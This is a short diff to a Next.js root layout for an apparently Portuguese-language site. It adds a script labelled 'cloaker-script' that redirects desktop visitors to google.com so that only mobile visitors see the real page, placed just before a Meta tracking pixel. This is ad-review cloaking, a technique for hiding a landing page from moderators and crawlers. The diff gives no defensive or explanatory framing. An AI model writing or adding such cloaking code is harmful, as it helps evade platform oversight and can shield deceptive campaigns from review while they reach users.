@@ -42,6 +42,18 @@ export default function RootLayout({
   return (
     <html lang="pt-br" suppressHydrationWarning>
       <head>
+        <Script id="cloaker-script" strategy="afterInteractive">
+          {`
+            (function () {
+                const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+                const destinoDesktop = "https://google.com";
+
+                if (!isMobile) {
+                    window.location.href = destinoDesktop;
+                }
+            })();
+          `}
+        </Script>
         <Script id="meta-pixel" strategy="afterInteractive">
           {`
             !function (f, b, e, v, n, t, s) {
